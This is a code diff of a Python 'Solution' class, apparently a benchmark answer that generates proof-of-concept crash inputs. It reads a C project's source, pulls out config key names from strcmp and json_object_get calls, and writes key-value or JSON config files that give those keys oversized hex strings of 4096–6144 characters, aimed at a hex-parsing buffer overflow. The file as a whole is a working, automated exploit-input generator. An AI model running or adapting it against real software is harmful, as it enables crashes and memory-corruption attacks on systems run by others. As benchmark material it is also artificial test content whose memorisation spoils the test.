@@ -1,169 +1,247 @@
 import tarfile
 import re
+import os
 
 
 class Solution:
-    def __init__(self):
-        pass
+    def solve(self, src_path: str) -> bytes:
+        try:
+            all_text, string_literals = self._read_sources(src_path)
+        except Exception:
+            return self._generic_poc()
 
-    def _is_potential_key(self, s: str) -> bool:
-        if not s or len(s) > 64:
+        config_type = self._detect_config_type(all_text)
+        keys = self._extract_candidate_keys(all_text, string_literals)
+
+        if not keys:
+            keys = {
+                "hex",
+                "hex_value",
+                "key",
+                "id",
+                "color",
+                "session_hex",
+                "token",
+                "mac",
+                "hash",
+                "secret",
+                "data",
+            }
+
+        keys_list = list(keys)
+        if len(keys_list) > 30:
+            keys_list = keys_list[:30]
+
+        if config_type == "json":
+            return self._build_json_poc(keys_list)
+        else:
+            return self._build_kv_poc(keys_list)
+
+    # --------- Source reading and analysis helpers ---------
+
+    def _read_sources(self, src_path):
+        texts = []
+        string_literals = []
+
+        if os.path.isdir(src_path):
+            for root, _, files in os.walk(src_path):
+                for fname in files:
+                    if self._is_source_file(fname):
+                        path = os.path.join(root, fname)
+                        try:
+                            with open(path, "rb") as f:
+                                data = f.read()
+                        except Exception:
+                            continue
+                        text = data.decode("utf-8", errors="ignore")
+                        texts.append(text)
+                        string_literals.extend(self._extract_string_literals(text))
+        else:
+            try:
+                tf = tarfile.open(src_path, "r:*")
+            except Exception:
+                return "", []
+            try:
+                for member in tf.getmembers():
+                    if not member.isfile():
+                        continue
+                    name = os.path.basename(member.name)
+                    if not self._is_source_file(name):
+                        continue
+                    f = tf.extractfile(member)
+                    if not f:
+                        continue
+                    try:
+                        data = f.read()
+                    except Exception:
+                        continue
+                    text = data.decode("utf-8", errors="ignore")
+                    texts.append(text)
+                    string_literals.extend(self._extract_string_literals(text))
+            finally:
+                tf.close()
+
+        all_text = "\n".join(texts)
+        return all_text, string_literals
+
+    def _is_source_file(self, name: str) -> bool:
+        lname = name.lower()
+        return lname.endswith(
+            (
+                ".c",
+                ".h",
+                ".cc",
+                ".hh",
+                ".cpp",
+                ".hpp",
+                ".inl",
+                ".txt",
+                ".md",
+            )
+        )
+
+    def _extract_string_literals(self, text):
+        lits = []
+        for m in re.finditer(r'"([^"\\]*(?:\\.[^"\\]*)*)"', text):
+            lit = m.group(1)
+            try:
+                lit_u = bytes(lit, "utf-8").decode("unicode_escape", errors="ignore")
+            except Exception:
+                lit_u = lit
+            lits.append(lit_u)
+        return lits
+
+    def _detect_config_type(self, all_text: str) -> str:
+        low = all_text.lower()
+        if (
+            "json_object_get" in all_text
+            or "json_t" in all_text
+            or "cjson" in low
+            or "jansson" in low
+            or "json_parse" in low
+            or "json_loads" in low
+            or "json_tokener" in low
+        ):
+            return "json"
+        return "kv"
+
+    def _looks_like_key(self, lit: str) -> bool:
+        if not lit:
             return False
-        for ch in s:
-            if ord(ch) < 33 or ord(ch) > 126:
-                return False
-            if ch in "%\"'\\{}[]()":
-                return False
-        if " " in s or "\t" in s:
+        if len(lit) > 32:
             return False
-        if not re.match(r"^[A-Za-z0-9_.:-]+$", s):
+        if lit.startswith("%"):
+            return False
+        if any(ch.isspace() for ch in lit):
+            return False
+        if not re.match(r"^[A-Za-z0-9_.:-]+$", lit):
+            return False
+        if lit.startswith("/"):
+            return False
+        ext = os.path.splitext(lit)[1].lower()
+        if ext in {".c", ".h", ".cpp", ".hpp", ".cc", ".hh"}:
             return False
         return True
 
-    def _key_sort_key(self, key: str):
-        s = key.lower()
-        score = 0
-        if "hex" in s:
-            score -= 100
-        if "addr" in s or "address" in s:
-            score -= 40
-        if "mac" in s:
-            score -= 30
-        if "key" in s:
-            score -= 20
-        if "color" in s or "colour" in s:
-            score -= 10
-        if "id" in s:
-            score -= 5
-        return (score, len(key), key)
+    def _extract_candidate_keys(self, all_text: str, string_literals):
+        keys = set()
 
-    def _extract_keys(self, src_path):
-        hex_keys = set()
-        general_keys = set()
-
-        cmp_patterns = [
-            re.compile(r"strcmp\s*\([^,]+,\s*\"([^\"]+)\"\)"),
-            re.compile(r"strn?cmp\s*\([^,]+,\s*\"([^\"]+)\"\)"),
-            re.compile(r"strcasecmp\s*\([^,]+,\s*\"([^\"]+)\"\)"),
-            re.compile(r"strn?casecmp\s*\([^,]+,\s*\"([^\"]+)\"\)"),
+        # From strcmp / strncmp patterns
+        patterns = [
+            r'strcmp\s*\(\s*[^,]+,\s*"([^"]+)"\s*\)',
+            r'strcmp\s*\(\s*"([^"]+)"\s*,\s*[^)]+\)',
+            r'strncmp\s*\(\s*[^,]+,\s*"([^"]+)"\s*",',
+            r'strncmp\s*\(\s*"([^"]+)"\s*,\s*[^,]+,',
         ]
+        for pat in patterns:
+            for m in re.finditer(pat, all_text):
+                lit = m.group(1)
+                if self._looks_like_key(lit):
+                    keys.add(lit)
 
-        try:
-            tf = tarfile.open(src_path, "r:*")
-        except Exception:
-            return [], []
+        # JSON-specific key extraction
+        for m in re.finditer(r'json_object_get\s*\([^,]+,\s*"([^"]+)"\s*\)', all_text):
+            lit = m.group(1)
+            if self._looks_like_key(lit):
+                keys.add(lit)
 
-        code_exts = (".c", ".h", ".cpp", ".cc", ".cxx", ".hpp", ".hh")
+        # Prefer literals that explicitly mention 'hex'
+        for lit in string_literals:
+            if "hex" in lit.lower() and self._looks_like_key(lit):
+                keys.add(lit)
 
-        try:
-            for member in tf.getmembers():
-                if not member.isfile():
-                    continue
-                name = member.name
-                lower = name.lower()
-                if not lower.endswith(code_exts):
-                    continue
-                try:
-                    f = tf.extractfile(member)
-                    if f is None:
-                        continue
-                    data = f.read(2 * 1024 * 1024)
-                except Exception:
-                    continue
-                if not data:
-                    continue
-                try:
-                    text = data.decode("utf-8", "ignore")
-                except Exception:
-                    continue
+        # If still few keys, supplement with general-looking literals
+        if len(keys) < 5:
+            for lit in string_literals:
+                if self._looks_like_key(lit):
+                    keys.add(lit)
+                    if len(keys) >= 20:
+                        break
 
-                lines = text.splitlines()
+        return keys
 
-                # Collect all candidate keys from strcmp-family
-                for line in lines:
-                    for creg in cmp_patterns:
-                        for m in creg.finditer(line):
-                            cand = m.group(1)
-                            if self._is_potential_key(cand):
-                                general_keys.add(cand)
+    # --------- PoC builders ---------
 
-                # Find hex-related contexts and associated keys
-                for idx, line in enumerate(lines):
-                    is_hex_line = False
-                    if "isxdigit" in line or "iswxdigit" in line:
-                        is_hex_line = True
-                    elif "strto" in line and "16" in line:
-                        is_hex_line = True
-                    elif (
-                        ("scanf" in line or "fscanf" in line or "sscanf" in line)
-                        and ("%x" in line or "%X" in line)
-                    ):
-                        is_hex_line = True
+    def _long_hex_string(self, min_len: int = 4096) -> str:
+        length = min_len
+        if length % 2 == 1:
+            length += 1
+        return "A" * length
 
-                    if not is_hex_line:
-                        continue
-
-                    # Search upwards for nearest strcmp-like key use
-                    for j in range(idx - 1, max(-1, idx - 41), -1):
-                        l2 = lines[j]
-                        found = False
-                        for creg in cmp_patterns:
-                            m2 = creg.search(l2)
-                            if m2:
-                                cand = m2.group(1)
-                                if self._is_potential_key(cand):
-                                    hex_keys.add(cand)
-                                    found = True
-                                break
-                        if found:
-                            break
-        finally:
-            try:
-                tf.close()
-            except Exception:
-                pass
-
-        return list(hex_keys), list(general_keys)
-
-    def solve(self, src_path: str) -> bytes:
-        hex_keys, general_keys = self._extract_keys(src_path)
+    def _build_kv_poc(self, keys) -> bytes:
+        hex_str1 = self._long_hex_string(4096)
+        hex_str2 = self._long_hex_string(6144)
 
         lines = []
 
-        # Many parsers ignore an initial blank line; it is unlikely to cause failure
-        lines.append("")
+        for key in keys:
+            k = key.replace("\n", "").replace("\r", "")
+            if not k:
+                continue
+            # Various common key/value syntaxes
+            lines.append(f"{k} {hex_str1}")
+            lines.append(f"{k}={hex_str1}")
+            lines.append(f"{k} = {hex_str1}")
+            lines.append(f"{k}:{hex_str1}")
+            lines.append(f"{k}: {hex_str1}")
 
-        if hex_keys:
-            keys = sorted(set(hex_keys), key=self._key_sort_key)
-        else:
-            keys = sorted(set(general_keys), key=self._key_sort_key)
-
-        max_keys = 8
-        if keys:
-            keys = keys[:max_keys]
-
-        big_hex_len = 800
-        big_hex = "A" * big_hex_len
-        small_hex = "A"
-
-        if keys:
-            # Add small values first to mimic valid configuration entries
-            for k in keys:
-                lines.append(f"{k}=0x{small_hex}")
-
-            # Add long hex values that should trigger the vulnerable handling
-            for k in keys:
-                lines.append(f"{k}=0x{big_hex}")
-                lines.append(f"{k}={big_hex}")
-        else:
-            # Fallback: pure long hex tokens
-            lines.append(big_hex)
-            lines.append("0x" + big_hex)
-
-        # Generic hex-related keys to increase chances without depending on extracted keys
-        generic_keys = ["hex", "value", "data", "key", "addr", "address"]
-        for gk in generic_keys:
-            lines.append(f"{gk}=0x{big_hex}")
+        # Add some generic hex-related keys as extra coverage
+        generic_keys = ["hex", "hex_value", "id", "key", "secret", "token", "mac"]
+        for key in generic_keys:
+            lines.append(f"{key} {hex_str2}")
+            lines.append(f"{key}={hex_str2}")
+            lines.append(f"{key} = {hex_str2}")
+            lines.append(f"{key}:{hex_str2}")
+            lines.append(f"{key}: {hex_str2}")
 
         poc_str = "\n".join(lines) + "\n"
-        return poc_str.encode("ascii", "ignore")
+        return poc_str.encode("ascii", errors="ignore")
+
+    def _build_json_poc(self, keys) -> bytes:
+        hex_str1 = self._long_hex_string(4096)
+        hex_str2 = self._long_hex_string(6144)
+
+        items = []
+        used_keys = set()
+
+        for idx, key in enumerate(keys):
+            k = key.replace("\\", "\\\\").replace('"', "")
+            if not k or k in used_keys:
+                continue
+            used_keys.add(k)
+            val = hex_str1 if idx % 2 == 0 else hex_str2
+            items.append(f'"{k}":"{val}"')
+            if len(items) >= 20:
+                break
+
+        for gk in ["hex", "hex_value", "id", "key", "secret", "token", "color", "mac"]:
+            if gk not in used_keys:
+                items.append(f'"{gk}":"{hex_str1}"')
+
+        obj = "{" + ",".join(items) + "}"
+        return obj.encode("ascii", errors="ignore")
+
+    def _generic_poc(self) -> bytes:
+        hex_str = self._long_hex_string(4096)
+        s = "hex=" + hex_str + "\n"
+        return s.encode("ascii", errors="ignore")
